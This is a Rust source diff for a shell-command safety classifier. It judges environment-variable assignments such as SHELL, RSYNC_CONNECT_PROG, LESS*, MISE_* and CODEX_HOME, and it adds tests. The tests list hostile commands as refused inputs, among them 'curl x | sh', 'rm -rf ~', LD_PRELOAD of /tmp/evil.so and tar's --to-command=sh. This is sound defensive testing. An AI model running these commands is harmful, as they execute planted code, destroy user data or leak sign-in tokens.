@@ -29,10 +29,15 @@ use serde::Deserialize;
 
 use crate::verdict::{SafetyLevel, Verdict};
 
+mod command_search;
+pub(crate) use command_search::names_command_search;
 mod config_dir;
+mod exported;
 mod option_string;
+pub(crate) use exported::exported_verdict;
 mod rebind;
 use option_string::option_string_verdict;
+mod shell_words;
 pub(crate) use rebind::{loop_var_verdict, rebinding_verdict};
 
 #[derive(Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
@@ -67,6 +72,16 @@ pub(crate) enum Shape {
     /// The value names a rustup toolchain, as `cargo +name` does. A path selects a toolchain
     /// directory whose binaries then run, so only the name shape the `+name` selector admits passes.
     ToolchainName,
+    /// The value names the shell a program starts (`SHELL`). Allowed only as one of the shells,
+    /// named in full in a standard system bin directory.
+    ShellProgram,
+    /// The value is the remote shell rsync starts (`RSYNC_RSH`). Allowed only as ssh or rsh with
+    /// plain options, the same rule as rsync's `-e`.
+    RemoteShell,
+    CommandSearch,
+    /// The value is pasted into a shell command line a program evaluates (`LANG` and `MANPATH` for
+    /// macOS man). Refused when it holds a character the shell would act on there.
+    ShellText,
 }
 
 /// The role a path-flag's value plays, spelled as [`crate::pathgate::Role`] spells it: read is
@@ -256,8 +271,7 @@ fn rule_of(name: &str) -> Option<&'static Rule> {
     if let Some(r) = TABLE.exact.get(name) {
         return Some(r);
     }
-    // npm matches `npm_config_` in any letter case and reads the rest as a lowercase key in which
-    // `_` and `-` are the same.
+    // npm matches `npm_config_` in any letter case and reads the rest as a lowercase key in which `_` and `-` are the same.
     if name.get(..NPM_CONFIG.len()).is_some_and(|p| p.eq_ignore_ascii_case(NPM_CONFIG)) {
         return TABLE.exact.get(&name.to_ascii_lowercase().replace('-', "_"));
     }
@@ -268,11 +282,19 @@ fn rule_of(name: &str) -> Option<&'static Rule> {
     })
 }
 
-/// The shape of a listed variable's value, or `None` for a name we do not inspect. Test-only: the
-/// classifier itself goes through `rule_of`, which also carries the option-string allowlist.
-#[cfg(test)]
+/// The shape of a listed variable's value, or `None` for a name we do not inspect.
 pub(crate) fn shape_of(name: &str) -> Option<Shape> {
     rule_of(name).map(|r| r.shape)
+}
+
+/// The verdict for an assignment that may outlive one command: a bare `NAME=value` statement or
+/// `export`/`declare` (`lasting`), or a prefix to one command. `RIPGREP_CONFIG_PATH` can make rg
+/// follow links, which is judged only for the command it prefixes, so a lasting one is refused.
+pub(crate) fn statement_assignment_verdict(name: &str, value: &str, lasting: bool) -> Verdict {
+    if lasting && name.strip_suffix('+').unwrap_or(name) == crate::pathctx::RIPGREP_CONFIG_PATH && !value.is_empty() {
+        return Verdict::Denied;
+    }
+    assignment_verdict(name, value)
 }
 
 /// The verdict for one `NAME=value` assignment. `Inert` for any name not in the table — the
@@ -283,14 +305,14 @@ pub(crate) fn assignment_verdict(name: &str, value: &str) -> Verdict {
     // operator. Normalised here rather than at each call site, so every spelling inherits it —
     // `export LD_PRELOAD+=/tmp/evil.so` and `declare -x LD_PRELOAD+=…` both appended to the real
     // LD_PRELOAD while classifying as the unlisted name `LD_PRELOAD+`, and auto-approved.
-    let name = name.strip_suffix('+').unwrap_or(name);
+    let (name, appends) = name.strip_suffix('+').map_or((name, false), |n| (n, true));
     let Some(rule) = rule_of(name) else {
         return Verdict::Allowed(SafetyLevel::Inert);
     };
     // An EMPTY value un-sets the behaviour rather than pointing it anywhere: `GIT_PAGER=` disables
     // the pager, `LD_PRELOAD=` preloads nothing. Denying that would be a false positive on the one
     // spelling that is unambiguously inert.
-    if value.is_empty() && !rule.presence {
+    if value.is_empty() && !rule.presence && rule.shape != Shape::CommandSearch {
         return Verdict::Allowed(SafetyLevel::Inert);
     }
     match rule.shape {
@@ -302,6 +324,10 @@ pub(crate) fn assignment_verdict(name: &str, value: &str) -> Verdict {
         Shape::OptionString => option_string_verdict(value, &rule.allowed, &rule.path_flags),
         Shape::ConfigDir => worst_element(value, config_dir::config_dir_verdict, !rule.single_value),
         Shape::ConfigFile => worst_element(value, config_dir::config_file_verdict, !rule.single_value),
+        Shape::ShellProgram => shell_words::shell_program_verdict(value),
+        Shape::RemoteShell => crate::handlers::coreutils::rsync_shell::remote_shell_verdict(value),
+        Shape::CommandSearch => command_search::command_search_verdict(name, appends, value),
+        Shape::ShellText => shell_words::shell_text_verdict(value),
         Shape::ToolchainName => {
             if is_toolchain_name(value) {
                 Verdict::Allowed(SafetyLevel::Inert)
@@ -310,6 +336,12 @@ pub(crate) fn assignment_verdict(name: &str, value: &str) -> Verdict {
             }
         }
     }
+}
+
+pub(crate) fn is_toolchain_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
 }
 
 /// A path supplying CODE, judged at the EXECUTOR locus — the rule cargo's `--manifest-path` uses.
@@ -322,12 +354,6 @@ pub(crate) fn assignment_verdict(name: &str, value: &str) -> Verdict {
 ///
 /// A colon-separated list is judged by its WORST element: one attacker-controlled entry is enough,
 /// because the loader searches all of them.
-pub(crate) fn is_toolchain_name(name: &str) -> bool {
-    !name.is_empty()
-        && name.starts_with(|c: char| c.is_ascii_alphanumeric())
-        && name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
-}
-
 fn exec_path_verdict(value: &str, split_list: bool) -> Verdict {
     // `execute_file_verdict` IS the executor-locus rule — the same function pathgate's `exec` role
     // uses for `cargo --manifest-path`. Reused rather than re-derived: an earlier cut compared
@@ -1042,6 +1068,112 @@ mod integration_tests {
         }
     }
 
+    /// grep, tar and the Info-ZIP tools read an option string from the environment ahead of their
+    /// own arguments, so a flag refused on the command line must not arrive that way.
+    #[test]
+    fn an_archive_or_search_tool_takes_no_options_from_the_environment() {
+        for (cmd, bare) in [
+            ("GREP_OPTIONS=-r grep key ~", "grep key notes.txt"),
+            ("TAR_OPTIONS=--to-command=sh tar -tf a.tar", "tar -tf a.tar"),
+            ("ZIPOPT=-TTsh zip -T o.zip f", "zip -T o.zip f"),
+            ("ZIP=-TTsh zip -T o.zip f", "zip -T o.zip f"),
+            ("UNZIP=-d/etc unzip -l a.zip", "unzip -l a.zip"),
+            ("UNZIPOPT=-d/etc unzip -l a.zip", "unzip -l a.zip"),
+            ("ZIPINFO=-v zipinfo a.zip", "zipinfo a.zip"),
+            ("ZIPINFOOPT=-v zipinfo a.zip", "zipinfo a.zip"),
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd} was allowed");
+            assert!(crate::is_safe_command(bare), "{bare} should still be allowed");
+        }
+    }
+
+    /// screen and tmux start `$SHELL` for a new window, and screen reads its rc file from
+    /// `SCREENRC` or `SYSSCREENRC`. Measured on screen 4.00.03 and tmux 3.6: each ran a planted script.
+    #[test]
+    fn a_session_never_starts_a_planted_shell_or_rc_file() {
+        for cmd in [
+            "SHELL=./x.sh screen -r x", "SHELL=/tmp/evil screen", "env SHELL=./x.sh screen -r", "export SHELL=./x.sh; screen -r",
+            "SHELL=./x.sh tmux new -d", "SHELL=~/bin/zsh tmux new -d", "SHELL='/bin/sh -c id' tmux new -d",
+            "SHELL=/bin/../tmp/x tmux new -d", "SCREENRC=./evil.rc screen -r", "SCREENRC=/tmp/evil.rc screen",
+            "SYSSCREENRC=/tmp/evil.rc screen", "env SCREENRC=./evil.rc screen", "export SCREENRC=./evil.rc && screen",
+            "export SYSSCREENRC=./evil.rc; screen", "SHELL=bash screen -r x", "SHELL=x.sh screen -r x", "export SHELL=zsh; screen -r x",
+            "env SHELL=sh screen -x x", "SHELL=bash tmux new -d", "SHELL=x.sh tmux new -d",
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd} must not be approved");
+        }
+        for cmd in
+            ["SHELL=/bin/zsh tmux new -d", "SHELL=/opt/homebrew/bin/fish tmux new -d", "SHELL=/bin/zsh screen -r x", "SHELL= tmux new -d"]
+        {
+            assert!(crate::is_safe_command(cmd), "{cmd} should be approved");
+        }
+    }
+
+    /// A standard bin directory holds programs that are not shells. Started as `$SHELL`, make and
+    /// just read a Makefile or justfile from the folder, and an interpreter or editor takes the
+    /// session's command string as its own input, so only a shell's name is accepted.
+    #[test]
+    fn a_session_shell_must_be_a_shell() {
+        for cmd in [
+            "SHELL=/usr/bin/make tmux new -d", "SHELL=/opt/homebrew/bin/just tmux new -d", "SHELL=/usr/bin/make screen -r -R x",
+            "SHELL=/opt/homebrew/bin/python3 screen -r x", "SHELL=/usr/bin/vim screen -r x", "SHELL=/usr/bin/env screen -r x",
+            "SHELL=/usr/local/bin/x screen -r x", "SHELL=/usr/bin/gmake tmux new -d", "SHELL=/bin/sh.evil tmux new -d",
+            "SHELL=/usr/bin/bash5 tmux new -d",
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd} must not be approved");
+        }
+        for shell in ["sh", "bash", "zsh", "dash", "ksh", "tcsh", "csh", "fish"] {
+            for dir in ["/bin", "/usr/bin", "/usr/local/bin", "/opt/homebrew/bin"] {
+                let cmd = format!("SHELL={dir}/{shell} tmux new -d");
+                assert!(crate::is_safe_command(&cmd), "{cmd} should be approved");
+            }
+        }
+    }
+
+    /// `CODEX_HOME` picks the folder whose config.toml names the notify program and MCP servers, and
+    /// `CODEX_CLOUD_TASKS_BASE_URL` picks the server the cloud subcommands send the sign-in token to.
+    #[test]
+    fn no_codex_config_or_server_arrives_through_the_environment() {
+        for cmd in [
+            "CODEX_HOME=./x codex cloud list",
+            "CODEX_HOME=/tmp/x codex apply x",
+            "env CODEX_HOME=./x codex features list",
+            "export CODEX_HOME=./x; codex cloud status x",
+            "CODEX_CLOUD_TASKS_BASE_URL=http://x codex cloud list",
+            "env CODEX_CLOUD_TASKS_BASE_URL=http://x codex cloud diff x",
+            "export CODEX_CLOUD_TASKS_BASE_URL=http://x; codex apply x",
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd} must not be approved");
+        }
+    }
+
+    /// mise reads every setting from a `MISE_` variable, and several of them choose which config
+    /// files load or are trusted, so a trusted config's hooks, tasks and `[env]` scripts run.
+    #[test]
+    fn no_mise_setting_arrives_through_the_environment() {
+        for cmd in [
+            "MISE_TRUSTED_CONFIG_PATHS=/ mise ls",
+            "MISE_TRUSTED_CONFIG_PATHS=. mise env",
+            "env MISE_TRUSTED_CONFIG_PATHS=/ mise ls",
+            "export MISE_TRUSTED_CONFIG_PATHS=/; mise ls",
+            "MISE_TRUSTED_CONFIG_PATHS=/ mise exec -- ls",
+            "MISE_GLOBAL_CONFIG_FILE=./evil.toml mise ls",
+            "MISE_CONFIG_FILE=./evil.toml mise ls",
+            "MISE_SYSTEM_CONFIG_FILE=./e.toml mise ls",
+            "MISE_PARANOID=0 mise ls",
+            "MISE_YES=1 mise ls",
+            "MISE_CONFIG_DIR=./x mise ls",
+            "MISE_DATA_DIR=./x mise ls",
+            "MISE_OVERRIDE_CONFIG_FILENAMES=evil.toml mise ls",
+            "MISE_TRUSTED_CONFIG_PATHS=/ cargo build",
+            "mise set MISE_TRUSTED_CONFIG_PATHS=/",
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd} must not be approved");
+        }
+        for cmd in ["mise ls", "MISE_TRUSTED_CONFIG_PATHS= mise ls", "MISEX=1 mise ls"] {
+            assert!(crate::is_safe_command(cmd), "{cmd} should be approved");
+        }
+    }
+
     /// The loader, locale, resolver and interpreter variables audited after `GCONV_PATH` was found
     /// missing. Each names code, a program, or a file the process writes, from outside the project.
     #[test]
@@ -1083,6 +1215,10 @@ mod integration_tests {
             "GIT_TRACE=/etc/m git status",
             "GIT_TRACE_PACKET=/etc/m git status",
             "SSLKEYLOGFILE=/etc/m curl https://example.com",
+            "MAVEN_ARGS=-Dmaven.ext.class.path=/tmp/e.jar mvn test",
+            "MAVEN_ARGS=deploy mvn test",
+            "ANSIBLE_LOG_PATH=~/.bashrc ansible-vault --version",
+            "ANSIBLE_LOG_PATH=/etc/m ansible-doc -l",
             "BROWSER='sh -c m' ls",
         ] {
             assert!(!crate::is_safe_command(cmd), "an audited variable was allowed: {cmd}");
@@ -1091,6 +1227,22 @@ mod integration_tests {
 
     /// The second audit: build tools, pagers, prompts, editors and config locations. Each pair is
     /// the variable with a foreign value, refused, and with a benign one, still approved.
+    #[test]
+    fn any_program_rsync_would_run_to_reach_a_daemon_is_refused() {
+        for cmd in [
+            "RSYNC_CONNECT_PROG=id rsync rsync://x/foo dst/",
+            "RSYNC_CONNECT_PROG=cat rsync ./src/ ./dst/",
+            "RSYNC_CONNECT_PROG='ssh proxy nc %H 873' rsync host::mod/ ./dst/",
+            "RSYNC_CONNECT_PROG='curl x | sh' rsync host::mod/ ./dst/",
+            "env RSYNC_CONNECT_PROG='rm -rf ~' rsync ./src/ ./dst/",
+            "export RSYNC_CONNECT_PROG='sh -c \"rm -rf ~\"'; rsync ./src/ ./dst/",
+        ] {
+            assert!(!crate::is_safe_command(cmd), "{cmd}");
+        }
+        assert!(crate::is_safe_command("RSYNC_CONNECT_PROG= rsync rsync://x/foo dst/"));
+        assert!(crate::is_safe_command("rsync rsync://x/foo dst/"));
+    }
+
     #[test]
     fn every_variable_of_the_second_audit_judges_its_value() {
         let _ctx = crate::pathctx::enter(crate::pathctx::PathCtx {
@@ -1142,7 +1294,27 @@ mod integration_tests {
             ("DELTA_PAGER='sh -c m' ls", "DELTA_PAGER=cat ls"),
             ("BAT_CONFIG_PATH=/tmp/m ls", "BAT_CONFIG_PATH=./bat.conf ls"),
             ("LESS='+/!m' ls", "LESS= ls"),
-            ("LESSKEYIN=/tmp/m ls", "LESSKEYIN=./lesskey ls"),
+            ("LESS_IS_MORE=1 less -p '!m' x", "LESS_IS_MORE= ls"),
+            ("MORE='+!m' more x", "MORE= ls"),
+            ("LESSKEYIN=./lesskey ls", "LESSKEYIN= ls"),
+            ("LESSKEYIN_SYSTEM=./lesskey ls", "LESSKEYIN_SYSTEM= ls"),
+            ("LESSKEY=./lesskey ls", "LESSKEY= ls"),
+            ("LESSKEY_SYSTEM=./lesskey ls", "LESSKEY_SYSTEM= ls"),
+            ("LESSKEY_CONTENT='#env' ls", "LESSKEY_CONTENT= ls"),
+            ("LESSKEY_CONTENT_SYSTEM='#env' ls", "LESSKEY_CONTENT_SYSTEM= ls"),
+            ("LESSGLOBALTAGS='sh -c m' less -t x", "LESSGLOBALTAGS=cat less -t x"),
+            ("LESSHISTFILE=~/.zshrc less x", "LESSHISTFILE=./.lesshst less x"),
+            ("LESSEDIT='sh -c m' less x", "LESSEDIT=cat less x"),
+            ("WHATISPAGER='sh -c m' man -k ls", "WHATISPAGER=cat man -k ls"),
+            ("MANOPT=--pager=m man ls", "MANOPT= man ls"),
+            ("VIM=./vv vim x", "VIM= vim x"),
+            ("VIMRUNTIME=/tmp/rt vim x", "VIMRUNTIME= vim x"),
+            ("GVIMINIT='!m' ls", "GVIMINIT= ls"),
+            ("NVIM_APPNAME=../m nvim x", "NVIM_APPNAME= nvim x"),
+            ("EMACSLOADPATH=/tmp/e emacs x", "EMACSLOADPATH= emacs x"),
+            ("EMACSPATH=/tmp/e emacs x", "EMACSPATH= emacs x"),
+            ("EMACSDATA=/tmp/e emacs x", "EMACSDATA= emacs x"),
+            ("EMACSNATIVELOADPATH=/tmp/e emacs x", "EMACSNATIVELOADPATH= emacs x"),
             ("DOCKER_HOST=ssh://m ls", "DOCKER_HOST= ls"),
             ("GOROOT=/tmp/m go list ./...", "GOROOT=./go go list ./..."),
             ("GOENV=/tmp/m go list ./...", "GOENV=./go.env go list ./..."),
@@ -1151,13 +1323,27 @@ mod integration_tests {
             ("MAKEFLAGS='-f /tmp/m' ls", "MAKEFLAGS= ls"),
             ("npm_config_script_shell=/tmp/m npm test", "npm_config_script_shell=cat npm test"),
             ("NPM_CONFIG_SCRIPT_SHELL=/tmp/m npm test", "NPM_CONFIG_SCRIPT_SHELL=cat npm test"),
-            ("Npm_Config_Script-Shell=/tmp/m npm test", "npm_config_loglevel=silent npm test"),
+            ("env Npm_Config_Script-Shell=/tmp/m npm test", "npm_config_loglevel=silent npm test"),
             ("npm_config_shell=/tmp/m npm test", "npm_config_shell=cat npm test"),
             ("npm_config_git=/tmp/m npm test", "npm_config_git=cat npm test"),
             ("npm_config_node_options='--require /tmp/m.js' npm test", "npm_config_node_options=--no-warnings npm test"),
             ("NPM_CONFIG_NODE_OPTIONS='--require /tmp/m.js' npm test", "NPM_CONFIG_NODE_OPTIONS=--no-warnings npm test"),
             ("npm_config_userconfig=/tmp/m npm test", "npm_config_userconfig=/work/u/proj/npmrc npm test"),
             ("npm_config_globalconfig=/tmp/m npm test", "npm_config_globalconfig=/work/u/proj/npmrc npm test"),
+        ] {
+            assert!(!crate::command_verdict(foreign).is_allowed(), "a foreign value was allowed: {foreign}");
+            assert!(crate::command_verdict(benign).is_allowed(), "a benign value was refused: {benign}");
+        }
+    }
+
+    #[test]
+    fn every_variable_of_the_second_audit_judges_its_value_part_two() {
+        let _ctx = crate::pathctx::enter(crate::pathctx::PathCtx {
+            cwd: Some("/work/u/proj".into()),
+            root: Some("/work/u/proj".into()),
+            ..Default::default()
+        });
+        for (foreign, benign) in [
             ("npm_config_registry=https://m npx eslint src/", "npm_config_registry= npx eslint src/"),
             ("NPM_CONFIG_REGISTRY=https://m npx eslint src/", "NPM_CONFIG_REGISTRY= npx eslint src/"),
             ("npm_config_strict_ssl=false npx eslint src/", "npm_config_strict_ssl= npx eslint src/"),
@@ -1194,10 +1380,37 @@ mod integration_tests {
     }
 
     #[test]
+    fn every_archive_and_kubectl_twin_of_the_third_audit_judges_its_value() {
+        let _ctx = crate::pathctx::enter(crate::pathctx::PathCtx {
+            cwd: Some("/work/u/proj".into()),
+            root: Some("/work/u/proj".into()),
+            ..Default::default()
+        });
+        for (foreign, benign) in [
+            ("TAPE=~/.zshrc tar -c .", "TAPE= ls"),
+            ("TAPE=x.tar tar -t", "TAPE= ls"),
+            ("KUBECTL_EXTERNAL_DIFF=/tmp/m kubectl version --client", "KUBECTL_EXTERNAL_DIFF=cat kubectl version --client"),
+            ("KUBERC=/tmp/m kubectl version --client", "KUBERC= kubectl version --client"),
+            ("KUBECTL_KUBERC=true kubectl version --client", "KUBECTL_KUBERC= kubectl version --client"),
+            ("KUBECACHEDIR=/tmp/c kubectl version --client", "KUBECACHEDIR= kubectl version --client"),
+        ] {
+            assert!(!crate::command_verdict(foreign).is_allowed(), "a foreign value was allowed: {foreign}");
+            assert!(crate::command_verdict(benign).is_allowed(), "a benign value was refused: {benign}");
+        }
+    }
+
+    #[test]
     fn an_audited_variable_with_a_project_value_still_allows() {
         for cmd in [
-            "GCONV_PATH=./gconv ls", "GEM_HOME=./vendor/gems ls", "BUNDLE_GEMFILE=./Gemfile ls", "GIT_TRACE=1 git status",
-            "GIT_TRACE=trace.log git status", "SSLKEYLOGFILE=keys.log ls", "BROWSER=cat ls", "LD_PRELOAD= ls",
+            "GCONV_PATH=./gconv ls",
+            "GEM_HOME=./vendor/gems ls",
+            "BUNDLE_GEMFILE=./Gemfile ls",
+            "GIT_TRACE=1 git status",
+            "GIT_TRACE=trace.log git status",
+            "SSLKEYLOGFILE=keys.log ls",
+            "BROWSER=cat ls",
+            "LD_PRELOAD= ls",
+            "ANSIBLE_LOG_PATH=./ansible.log ansible-vault --version",
         ] {
             assert!(crate::is_safe_command(cmd), "a project value was denied: {cmd}");
         }
@@ -1703,3 +1916,7 @@ mod integration_tests {
         assert!(!crate::is_safe_command("LD_PRELOAD=/tmp/evil.so ls"), "loading it must not be");
     }
 }
+
+#[cfg(test)]
+#[path = "envvars/description_twins_tests.rs"]
+mod description_twins_tests;
